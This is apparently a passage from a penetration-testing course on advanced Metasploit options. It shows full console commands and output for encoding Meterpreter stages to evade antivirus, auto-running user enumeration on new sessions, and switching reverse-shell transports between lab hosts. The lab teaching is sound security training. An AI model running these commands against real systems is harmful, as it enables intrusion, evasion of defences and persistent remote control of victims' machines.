With an understanding of the basic functionality of the Metasploit Framework and the meterpreter payload, we can proceed to more advanced options, which we can display with the show advanced command. Let's investigate a few of the more interesting options.

```
msf6 exploit(multi/handler) > show advanced

Module advanced options (exploit/multi/handler):

   Name                    Current Setting  Required  Description
   ----                    ---------------  --------  -----------
   ContextInformationFile                   no        The information file that contains context information
   DisablePayloadHandler   false            no        Disable the handler code for the selected payload
   EnableContextEncoding   false            no        Use transient context when encoding payloads
   ExitOnSession           true             yes       Return from the exploit after a session has been created
   ListenerTimeout         0                no        The maximum number of seconds to wait for new sessions
   VERBOSE                 false            no        Enable detailed status messages
   WORKSPACE                                no        Specify the workspace for this module
   WfsDelay                0                no        Additional delay when waiting for a session


Payload advanced options (windows/meterpreter/reverse_https):

   Name                         Current Setting                                                Required  Description
   ----                         ---------------                                                --------  -----------
   AutoLoadStdapi               true                                                           yes       Automatically load the Stdapi extension
   AutoRunScript                                                                               no        A script to run automatically on session creation.
   AutoSystemInfo               true                                                           yes       Automatically capture system information on initialization.
   AutoUnhookProcess            false                                                          yes       Automatically load the unhook extension and unhook the process
   ...
```

First, let's take a look at some advanced encoding options. In previous examples, we chose to encode the first stage of our shellcode that we placed into the exploit. Since the second stage of the Meterpreter payload is much larger and contains more potential signatures, it could potentially be flagged by various antivirus solutions, so we may opt to encode the second stage as well.

We could use _EnableStageEncoding_ together with _StageEncoder_ to encode the second stage and possibly bypass detection. To do this, we set _EnableStageEncoding_ to "true" and set _StageEncoder_ to our desired encoder, in this case, "x86/shikata_ga_nai":

```
msf6 exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true
msf6 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
StageEncoder => x86/shikata_ga_nai
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.118.2:443
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > 
[*] https://192.168.118.2:443 handling request from 192.168.120.11; (UUID: 77vpdgjz) Encoded stage with x86/shikata_ga_nai
[*] https://192.168.118.2:443 handling request from 192.168.120.11; (UUID: 77vpdgjz) Staging x86 payload (176249 bytes) ...
[*] Meterpreter session 7 opened (192.168.118.2:443 -> 192.168.120.11:50823) at 2021-01-22 11:36:39 -0500

msf6 exploit(multi/handler) > 
```

The _AutoRunScript_ option is also quite helpful as it will automatically run a script when a meterpreter connection is established. This is very useful during a client-side attack since we may not be available when a user executes our payload, meaning the session could sit idle or be lost. For example, we can configure the gather/enum_logged_on_users module to automatically enumerate logged-in users when meterpreter connects:

```
msf6 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
AutoRunScript => windows/gather/enum_logged_on_users

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.

[*] Started HTTPS reverse handler on https://192.168.118.2:443
msf6 exploit(multi/handler) > 

[*] https://192.168.118.2:443 handling request from 192.168.120.11; (UUID: j0sqkzo0) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 1 opened (192.168.118.2:443 -> 192.168.120.11:50839) at 2021-01-22 12:17:32 -0500
[*] Session ID 1 (192.168.118.2:443 -> 192.168.120.11:50839) processing AutoRunScript 'windows/gather/enum_logged_on_users'
[*] Running against session 1

Current Logged Users
====================

 SID                                           User
 ---                                           ----
 S-1-5-21-966894886-435473622-1450565287-1001  DESKTOP-6UTT671\Offsec


[+] Results saved in: /root/.msf4/loot/20210122121740_default_192.168.120.11_host.users.activ_586582.txt

Recently Logged Users
=====================

 SID                                           Profile Path
 ---                                           ------------
 S-1-5-18                                      %systemroot%\system32\config\systemprofile
 S-1-5-19                                      %systemroot%\ServiceProfiles\LocalService
 S-1-5-20                                      %systemroot%\ServiceProfiles\NetworkService
 S-1-5-21-966894886-435473622-1450565287-1001  C:\Users\Offsec



msf6 exploit(multi/handler) >
```

So far, we have navigated within a meterpreter session using various built-in commands, but we can also temporarily exit the meterpreter shell to perform other actions inside the Metasploit Framework, without closing down the connection. We can use background to return to the msfconsole prompt, where we can perform other actions within the framework. When we are ready to return to our meterpreter session, we can list all available sessions with sessions -l and jump back into our session with sessions -i (interact) followed by the respective Id as shown in Listing 56.

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 

msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x86/windows  DESKTOP-6UTT671\Offsec @ DESKTOP-6UTT671  192.168.118.2:443 -> 192.168.120.11:50839 (192.168.120.11)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

Using these commands, we can switch between available shells on different compromised hosts without closing down any of our connections.

In our previous examples, we have used a pre-defined communication protocol (like TCP or HTTPS) to exploit our target, which we chose when we generated the payload. However, we can use Meterpreter payload _transports_[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/metasploit-payloads/advanced-features-and-transports#fn1) to switch protocols after our initial compromise. We can list the currently available transports for the meterpreter connection with transport list.

```
meterpreter > transport list
Session Expiry  : @ 2021-01-29 12:17:33

    ID  Curr  URL                                                                                                         Comms T/O  Retry Total  Retry Wait
    --  ----  ---                                                                                                         ---------  -----------  ----------
    1   *     https://192.168.118.2:443/z1ZmjIKG4RbLjMqNq4fDJw04bX7nMAC9c8em5NsqBdxap5Q8rCmLeA1-OBJ2RHKEz2knBsYiQCYA01o/  300        3600         10

meterpreter >
```

We can also use transport add to add a new transport protocol to the current session, using -t to set the desired transport type.

In the example below, we will add the _reverse_tcp_ transport, which is equivalent to choosing the windows/meterpreter/reverse_tcp payload. We will apply the options for the specified transport type, including the local host IP address (-l) and the local port (-p):

```
meterpreter > transport add -t reverse_tcp -l 192.168.118.2 -p 5555
[*] Adding new transport ...
[+] Successfully added reverse_tcp transport.
meterpreter > transport list
Session Expiry  : @ 2021-01-29 12:17:32

    ID  Curr  URL                                                                                                         Comms T/O  Retry Total  Retry Wait
    --  ----  ---                                                                                                         ---------  -----------  ----------
    1   *     https://192.168.118.2:443/z1ZmjIKG4RbLjMqNq4fDJw04bX7nMAC9c8em5NsqBdxap5Q8rCmLeA1-OBJ2RHKEz2knBsYiQCYA01o/  300        3600         10
    2         tcp://192.168.118.2:5555                                                                                    300        3600         10

meterpreter >                                                            
```

Before we can take advantage of the new transport, we must set up a listener to accept the connection. We'll do this by once again selecting the multi/handler module and specifying the same parameters we selected earlier.

With the handler configured, we can return to the meterpreter session and run transport next to change to the newly-created transport mode. This will create a new session and close down the old one.

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.118.2
LHOST => 192.168.118.2
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.118.2:5555 

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 192.168.120.11 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > 
[*] Sending stage (175174 bytes) to 192.168.120.11
[*] Meterpreter session 2 opened (192.168.118.2:5555 -> 192.168.120.11:50843) at 2021-01-22 12:30:15 -0500
[*] Session ID 2 (192.168.118.2:5555 -> 192.168.120.11:50843) processing AutoRunScript 'windows/gather/enum_logged_on_users'
[*] Running against session 2

Current Logged Users
====================

 SID                                           User
 ---                                           ----
 S-1-5-21-966894886-435473622-1450565287-1001  DESKTOP-6UTT671\Offsec


[+] Results saved in: /root/.msf4/loot/20210122123019_default_192.168.120.11_host.users.activ_098683.txt

Recently Logged Users
=====================

 SID                                           Profile Path
 ---                                           ------------
 S-1-5-18                                      %systemroot%\system32\config\systemprofile
 S-1-5-19                                      %systemroot%\ServiceProfiles\LocalService
 S-1-5-20                                      %systemroot%\ServiceProfiles\NetworkService
 S-1-5-21-966894886-435473622-1450565287-1001  C:\Users\Offsec


msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  2         meterpreter x86/windows  DESKTOP-6UTT671\Offsec @ DESKTOP-6UTT671  192.168.118.2:5555 -> 192.168.120.11:50843 (192.168.120.11)



msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

We successfully switched transports, created a new meterpreter session, and shut down the old one.